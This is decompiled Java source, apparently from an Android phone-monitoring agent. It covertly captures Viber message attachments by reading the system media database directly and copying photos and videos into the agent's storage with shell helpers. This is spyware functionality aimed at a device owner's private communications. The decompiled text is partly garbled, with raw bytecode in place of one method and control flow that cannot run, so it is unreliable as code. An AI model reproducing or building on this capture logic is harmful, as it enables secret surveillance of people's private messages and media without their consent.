package com.vvt.capture.viber.mode.full;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.os.SystemClock;
import com.vvt.im.events.ImMediaFileType;
import com.vvt.im.events.ImType;
import com.vvt.io.d;
import com.vvt.io.p;
import com.vvt.shell.ShellUtil;
import java.io.File;

class a
{
  private static final boolean a;
  private static final boolean b;
  private static final boolean c;
  private static final boolean d;
  private static final File[] e;
  
  static
  {
    boolean bool1 = true;
    File localFile1 = null;
    boolean bool2 = com.vvt.ak.a.a;
    if (bool2) {
      bool2 = bool1;
    }
    for (;;)
    {
      a = bool2;
      b = com.vvt.ak.a.b;
      c = com.vvt.ak.a.d;
      d = com.vvt.ak.a.e;
      File[] arrayOfFile = new File[2];
      File localFile2 = new java/io/File;
      localFile2.<init>("/data/data/com.android.providers.media/databases/");
      arrayOfFile[0] = localFile2;
      localFile1 = new java/io/File;
      localFile1.<init>("/dbdata/databases/com.android.providers.media/");
      arrayOfFile[bool1] = localFile1;
      e = arrayOfFile;
      return;
      bool2 = false;
      arrayOfFile = null;
    }
  }
  
  private static SQLiteDatabase a(String paramString)
  {
    return a(paramString, 17);
  }
  
  private static SQLiteDatabase a(String paramString, int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    SQLiteDatabase localSQLiteDatabase = b(paramString, paramInt);
    int i = 5;
    while ((localSQLiteDatabase == null) && (i > 0))
    {
      boolean bool3 = a;
      if (bool3) {}
      long l = 1000L;
      SystemClock.sleep(l);
      localSQLiteDatabase = b(paramString, paramInt);
      i += -1;
    }
    boolean bool2 = a;
    if (bool2) {}
    return localSQLiteDatabase;
  }
  
  private static String a()
  {
    String str = d.h("/sdcard/viber/media/.converted_videos");
    File localFile = new java/io/File;
    localFile.<init>(str);
    boolean bool = localFile.exists();
    if (!bool) {
      str = null;
    }
    return str;
  }
  
  private static String a(Context paramContext, Uri paramUri)
  {
    int i = 1;
    for (;;)
    {
      try
      {
        String[] arrayOfString = new String[i];
        i = 0;
        Object localObject1 = null;
        localObject6 = "_data";
        arrayOfString[0] = localObject6;
        localObject1 = paramContext.getContentResolver();
        localObject6 = paramUri;
        localObject6 = ((ContentResolver)localObject1).query(paramUri, arrayOfString, null, null, null);
        localObject1 = "_data";
        if (localObject3 == null) {
          break label108;
        }
      }
      finally
      {
        try
        {
          i = ((Cursor)localObject6).getColumnIndexOrThrow((String)localObject1);
          ((Cursor)localObject6).moveToFirst();
          localObject1 = ((Cursor)localObject6).getString(i);
          if (localObject6 != null) {
            ((Cursor)localObject6).close();
          }
          return (String)localObject1;
        }
        finally
        {
          for (;;)
          {
            Object localObject6;
            Object localObject3;
            Object localObject5 = localObject6;
          }
        }
        localObject2 = finally;
        i = 0;
        localObject3 = null;
      }
      ((Cursor)localObject3).close();
      label108:
      i = 0;
      localObject3 = null;
    }
  }
  
  /* Error */
  private static String a(String paramString1, ViberMessageType paramViberMessageType, String paramString2)
  {
    // Byte code:
    //   0: iconst_1
    //   1: istore_3
    //   2: aconst_null
    //   3: astore 4
    //   5: getstatic 17	com/vvt/capture/viber/mode/full/a:a	Z
    //   8: istore 5
    //   10: iload 5
    //   12: ifeq +3 -> 15
    //   15: getstatic 17	com/vvt/capture/viber/mode/full/a:a	Z
    //   18: istore 5
    //   20: iload 5
    //   22: ifeq +3 -> 25
    //   25: aload_2
    //   26: ifnull +15 -> 41
    //   29: aload_2
    //   30: invokevirtual 106	java/lang/String:length	()I
    //   33: istore 5
    //   35: iload 5
    //   37: iload_3
    //   38: if_icmpge +6 -> 44
    //   41: aload 4
    //   43: areturn
    //   44: aload_2
    //   45: ldc 108
    //   47: invokevirtual 112	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   50: astore 6
    //   52: aload 6
    //   54: arraylength
    //   55: iconst_m1
    //   56: iadd
    //   57: istore_3
    //   58: aload 6
    //   60: iload_3
    //   61: aaload
    //   62: astore 6
    //   64: aload 6
    //   66: invokestatic 118	java/lang/Long:parseLong	(Ljava/lang/String;)J
    //   69: lstore 7
    //   71: aload_0
    //   72: invokestatic 121	com/vvt/capture/viber/mode/full/a:a	(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   75: astore 9
    //   77: aload 9
    //   79: ifnull +27 -> 106
    //   82: aload 9
    //   84: invokevirtual 126	android/database/sqlite/SQLiteDatabase:isDbLockedByCurrentThread	()Z
    //   87: istore 5
    //   89: iload 5
    //   91: ifne +15 -> 106
    //   94: aload 9
    //   96: invokevirtual 129	android/database/sqlite/SQLiteDatabase:isDbLockedByOtherThreads	()Z
    //   99: istore 5
    //   101: iload 5
    //   103: ifeq +46 -> 149
    //   106: getstatic 17	com/vvt/capture/viber/mode/full/a:a	Z
    //   109: istore 5
    //   111: iload 5
    //   113: ifeq +3 -> 116
    //   116: aload 9
    //   118: ifnull +8 -> 126
    //   121: aload 9
    //   123: invokevirtual 130	android/database/sqlite/SQLiteDatabase:close	()V
    //   126: iconst_0
    //   127: ifeq +9 -> 136
    //   130: aconst_null
    //   131: invokeinterface 102 1 0
    //   136: aload 9
    //   138: ifnull -97 -> 41
    //   141: aload 9
    //   143: invokevirtual 130	android/database/sqlite/SQLiteDatabase:close	()V
    //   146: goto -105 -> 41
    //   149: ldc -124
    //   151: astore 6
    //   153: iconst_4
    //   154: istore 10
    //   156: iload 10
    //   158: anewarray 4	java/lang/Object
    //   161: astore 11
    //   163: iconst_0
    //   164: istore 12
    //   166: ldc 73
    //   168: astore 13
    //   170: aload 11
    //   172: iconst_0
    //   173: aload 13
    //   175: aastore
    //   176: iconst_1
    //   177: istore 12
    //   179: ldc -121
    //   181: astore 13
    //   183: aload 11
    //   185: iload 12
    //   187: aload 13
    //   189: aastore
    //   190: iconst_2
    //   191: istore 12
    //   193: ldc -119
    //   195: astore 13
    //   197: aload 11
    //   199: iload 12
    //   201: aload 13
    //   203: aastore
    //   204: iconst_3
    //   205: istore 12
    //   207: lload 7
    //   209: invokestatic 142	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   212: astore 13
    //   214: aload 11
    //   216: iload 12
    //   218: aload 13
    //   220: aastore
    //   221: aload 6
    //   223: aload 11
    //   225: invokestatic 146	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   228: astore 6
    //   230: getstatic 152	com/vvt/capture/viber/mode/full/ViberMessageType:VIDEO	Lcom/vvt/capture/viber/mode/full/ViberMessageType;
    //   233: astore 11
    //   235: aload_1
    //   236: aload 11
    //   238: if_acmpne +84 -> 322
    //   241: ldc -124
    //   243: astore 6
    //   245: iconst_4
    //   246: istore 10
    //   248: iload 10
    //   250: anewarray 4	java/lang/Object
    //   253: astore 11
    //   255: iconst_0
    //   256: istore 12
    //   258: ldc 73
    //   260: astore 13
    //   262: aload 11
    //   264: iconst_0
    //   265: aload 13
    //   267: aastore
    //   268: iconst_1
    //   269: istore 12
    //   271: ldc -102
    //   273: astore 13
    //   275: aload 11
    //   277: iload 12
    //   279: aload 13
    //   281: aastore
    //   282: iconst_2
    //   283: istore 12
    //   285: ldc -119
    //   287: astore 13
    //   289: aload 11
    //   291: iload 12
    //   293: aload 13
    //   295: aastore
    //   296: iconst_3
    //   297: istore 12
    //   299: lload 7
    //   301: invokestatic 142	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   304: astore 14
    //   306: aload 11
    //   308: iload 12
    //   310: aload 14
    //   312: aastore
    //   313: aload 6
    //   315: aload 11
    //   317: invokestatic 146	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   320: astore 6
    //   322: getstatic 17	com/vvt/capture/viber/mode/full/a:a	Z
    //   325: istore_3
    //   326: iload_3
    //   327: ifeq +3 -> 330
    //   330: iconst_0
    //   331: istore_3
    //   332: aconst_null
    //   333: astore 14
    //   335: aload 9
    //   337: aload 6
    //   339: aconst_null
    //   340: invokevirtual 158	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   343: astore 6
    //   345: aload 6
    //   347: ifnonnull +31 -> 378
    //   350: getstatic 24	com/vvt/capture/viber/mode/full/a:MyUncaughtExceptionHandler	Z
    //   353: istore_3
    //   354: iload_3
    //   355: ifeq +3 -> 358
    //   358: aload 6
    //   360: ifnull +10 -> 370
    //   363: aload 6
    //   365: invokeinterface 102 1 0
    //   370: aload 9
    //   372: ifnull -331 -> 41
    //   375: goto -234 -> 141
    //   378: aload 6
    //   380: invokeinterface 94 1 0
    //   385: istore_3
    //   386: iload_3
    //   387: ifeq +27 -> 414
    //   390: ldc 73
    //   392: astore 14
    //   394: aload 6
    //   396: aload 14
    //   398: invokeinterface 161 2 0
    //   403: istore_3
    //   404: aload 6
    //   406: iload_3
    //   407: invokeinterface 98 2 0
    //   412: astore 4
    //   414: aload 6
    //   416: ifnull +10 -> 426
    //   419: aload 6
    //   421: invokeinterface 102 1 0
    //   426: aload 9
    //   428: ifnull +8 -> 436
    //   431: aload 9
    //   433: invokevirtual 130	android/database/sqlite/SQLiteDatabase:close	()V
    //   436: getstatic 17	com/vvt/capture/viber/mode/full/a:a	Z
    //   439: istore 5
    //   441: iload 5
    //   443: ifeq +3 -> 446
    //   446: getstatic 17	com/vvt/capture/viber/mode/full/a:a	Z
    //   449: istore 5
    //   451: iload 5
    //   453: ifeq -412 -> 41
    //   456: goto -415 -> 41
    //   459: astore 6
    //   461: iconst_0
    //   462: istore 5
    //   464: aconst_null
    //   465: astore 6
    //   467: getstatic 27	com/vvt/capture/viber/mode/full/a:d	Z
    //   470: istore_3
    //   471: iload_3
    //   472: ifeq +3 -> 475
    //   475: aload 6
    //   477: ifnull +10 -> 487
    //   480: aload 6
    //   482: invokeinterface 102 1 0
    //   487: aload 9
    //   489: ifnull -53 -> 436
    //   492: goto -61 -> 431
    //   495: astore 15
    //   497: iconst_0
    //   498: istore 5
    //   500: aconst_null
    //   501: astore 6
    //   503: aload 15
    //   505: astore 4
    //   507: aload 6
    //   509: ifnull +10 -> 519
    //   512: aload 6
    //   514: invokeinterface 102 1 0
    //   519: aload 9
    //   521: ifnull +8 -> 529
    //   524: aload 9
    //   526: invokevirtual 130	android/database/sqlite/SQLiteDatabase:close	()V
    //   529: aload 4
    //   531: athrow
    //   532: astore 4
    //   534: goto -27 -> 507
    //   537: astore 14
    //   539: goto -72 -> 467
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	542	0	paramString1	String
    //   0	542	1	paramViberMessageType	ViberMessageType
    //   0	542	2	paramString2	String
    //   1	60	3	i	int
    //   325	62	3	bool1	boolean
    //   403	4	3	j	int
    //   470	2	3	bool2	boolean
    //   3	527	4	localObject1	Object
    //   532	1	4	localObject2	Object
    //   8	13	5	bool3	boolean
    //   33	6	5	k	int
    //   87	412	5	bool4	boolean
    //   50	370	6	localObject3	Object
    //   459	1	6	localException1	Exception
    //   465	48	6	localObject4	Object
    //   69	231	7	l	long
    //   75	450	9	localSQLiteDatabase	SQLiteDatabase
    //   154	95	10	m	int
    //   161	155	11	localObject5	Object
    //   164	145	12	n	int
    //   168	126	13	localObject6	Object
    //   304	93	14	localObject7	Object
    //   537	1	14	localException2	Exception
    //   495	9	15	localObject8	Object
    // Exception table:
    //   from	to	target	type
    //   82	87	459	java/lang/Exception
    //   94	99	459	java/lang/Exception
    //   106	109	459	java/lang/Exception
    //   121	126	459	java/lang/Exception
    //   156	161	459	java/lang/Exception
    //   173	176	459	java/lang/Exception
    //   187	190	459	java/lang/Exception
    //   201	204	459	java/lang/Exception
    //   207	212	459	java/lang/Exception
    //   218	221	459	java/lang/Exception
    //   223	228	459	java/lang/Exception
    //   230	233	459	java/lang/Exception
    //   248	253	459	java/lang/Exception
    //   265	268	459	java/lang/Exception
    //   279	282	459	java/lang/Exception
    //   293	296	459	java/lang/Exception
    //   299	304	459	java/lang/Exception
    //   310	313	459	java/lang/Exception
    //   315	320	459	java/lang/Exception
    //   322	325	459	java/lang/Exception
    //   339	343	459	java/lang/Exception
    //   82	87	495	finally
    //   94	99	495	finally
    //   106	109	495	finally
    //   121	126	495	finally
    //   156	161	495	finally
    //   173	176	495	finally
    //   187	190	495	finally
    //   201	204	495	finally
    //   207	212	495	finally
    //   218	221	495	finally
    //   223	228	495	finally
    //   230	233	495	finally
    //   248	253	495	finally
    //   265	268	495	finally
    //   279	282	495	finally
    //   293	296	495	finally
    //   299	304	495	finally
    //   310	313	495	finally
    //   315	320	495	finally
    //   322	325	495	finally
    //   339	343	495	finally
    //   350	353	532	finally
    //   378	385	532	finally
    //   396	403	532	finally
    //   406	412	532	finally
    //   467	470	532	finally
    //   350	353	537	java/lang/Exception
    //   378	385	537	java/lang/Exception
    //   396	403	537	java/lang/Exception
    //   406	412	537	java/lang/Exception
  }
  
  public static String a(String paramString1, String paramString2, ViberMessageType paramViberMessageType, Context paramContext, com.vvt.base.b paramb)
  {
    Object localObject1 = null;
    try
    {
      localObject2 = b();
      boolean bool1 = com.vvt.ag.b.a((String)localObject2);
      if (bool1) {
        break label526;
      }
      localObject2 = a((String)localObject2, paramViberMessageType, paramString2);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject2;
        Object localObject4;
        boolean bool2;
        Object localObject5;
        String str1;
        int i;
        boolean bool3;
        Object localObject6;
        long l;
        boolean bool4 = d;
        if (bool4)
        {
          continue;
          bool4 = false;
          Object localObject3 = null;
        }
      }
    }
    if (localObject2 == null)
    {
      localObject4 = c();
      bool2 = com.vvt.ag.b.a((String)localObject4);
      if (!bool2) {
        localObject2 = a((String)localObject4, paramViberMessageType, paramString2);
      }
    }
    if (localObject2 == null)
    {
      localObject2 = Uri.parse(paramString2);
      localObject2 = a(paramContext, (Uri)localObject2);
    }
    localObject4 = ImMediaFileType.ATTACHMENT;
    localObject5 = ImType.VIBER;
    localObject5 = com.vvt.im.a.c.a(paramString1, (ImType)localObject5, (ImMediaFileType)localObject4);
    localObject4 = com.vvt.im.a.c.a((ImMediaFileType)localObject4);
    if (localObject2 != null)
    {
      localObject2 = d.h((String)localObject2);
      str1 = ".";
      i = ((String)localObject2).lastIndexOf(str1);
      str1 = ((String)localObject2).substring(i);
      bool3 = a;
      if (bool3) {}
      localObject6 = new java/io/File;
      ((File)localObject6).<init>((String)localObject2);
      bool4 = ((File)localObject6).exists();
      if (bool4)
      {
        l = ((File)localObject6).length();
        bool4 = c.a(paramViberMessageType, paramb, l);
        if (!bool4) {
          break label262;
        }
        bool4 = a;
        if (bool4) {}
        localObject2 = a((String)localObject5, (String)localObject4, str1);
        localObject4 = ((File)localObject6).getAbsolutePath();
        d.a((String)localObject4, (String)localObject2);
        localObject4 = paramb.f();
        ShellUtil.b((String)localObject4, (String)localObject2);
        localObject1 = localObject2;
      }
    }
    for (;;)
    {
      bool4 = a;
      if (bool4) {}
      return (String)localObject1;
      label262:
      localObject2 = ViberMessageType.VIDEO;
      if (paramViberMessageType == localObject2)
      {
        localObject2 = a();
        boolean bool5 = com.vvt.ag.b.a((String)localObject2);
        if (!bool5)
        {
          localObject6 = ((File)localObject6).getName();
          int j = ((String)localObject6).lastIndexOf(str1);
          StringBuilder localStringBuilder = new java/lang/StringBuilder;
          localStringBuilder.<init>();
          localObject6 = ((String)localObject6).substring(0, j);
          localObject6 = localStringBuilder.append((String)localObject6);
          String str2 = "_converted";
          localObject6 = ((StringBuilder)localObject6).append(str2);
          localObject6 = ((StringBuilder)localObject6).append(str1);
          localObject6 = ((StringBuilder)localObject6).toString();
          localObject6 = p.a((String)localObject2, (String)localObject6);
          bool4 = a;
          if (bool4) {}
          localObject2 = new java/io/File;
          ((File)localObject2).<init>((String)localObject6);
          boolean bool6 = ((File)localObject2).exists();
          if (bool6)
          {
            l = ((File)localObject2).length();
            bool4 = c.a(paramViberMessageType, paramb, l);
            if (bool4)
            {
              bool4 = a;
              if (bool4) {}
              localObject2 = a((String)localObject5, (String)localObject4, str1);
              d.a((String)localObject6, (String)localObject2);
              localObject4 = paramb.f();
              ShellUtil.b((String)localObject4, (String)localObject2);
            }
          }
        }
        for (;;)
        {
          localObject1 = localObject2;
          break;
          bool4 = a;
          if (bool4) {}
          bool4 = false;
          localObject2 = null;
        }
      }
      bool4 = a;
      if (!bool4) {}
    }
  }
  
  private static String a(String paramString1, String paramString2, String paramString3)
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localStringBuilder = localStringBuilder.append(paramString1);
    String str = File.separator;
    return str + paramString2 + paramString3;
  }
  
  private static SQLiteDatabase b(String paramString, int paramInt)
  {
    for (SQLiteDatabase localSQLiteDatabase = null;; localSQLiteDatabase = SQLiteDatabase.openDatabase(paramString, null, paramInt))
    {
      try
      {
        localFile = new java/io/File;
        localFile.<init>(paramString);
        bool = localFile.exists();
        if (bool) {
          break label34;
        }
        bool = d;
        if (!bool) {}
      }
      catch (SQLiteException localSQLiteException)
      {
        for (;;)
        {
          File localFile;
          label34:
          boolean bool = d;
          if (!bool) {}
        }
      }
      return localSQLiteDatabase;
      bool = false;
      localFile = null;
    }
  }
  
  private static String b()
  {
    boolean bool1 = a;
    if (bool1) {}
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    File[] arrayOfFile = e;
    String str1 = "external";
    String str2 = "db";
    boolean bool2 = d.a(arrayOfFile, str1, localStringBuilder, str2);
    if (!bool2)
    {
      bool2 = d;
      if (!bool2) {
        break label69;
      }
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return localStringBuilder.toString();
      label69:
      bool2 = b;
      if (!bool2) {}
    }
  }
  
  private static String c()
  {
    boolean bool1 = a;
    if (bool1) {}
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    File[] arrayOfFile = e;
    String str1 = "internal";
    String str2 = "db";
    boolean bool2 = d.a(arrayOfFile, str1, localStringBuilder, str2);
    if (!bool2)
    {
      bool2 = d;
      if (!bool2) {
        break label69;
      }
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return localStringBuilder.toString();
      label69:
      bool2 = a;
      if (!bool2) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/viber/mode/full/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */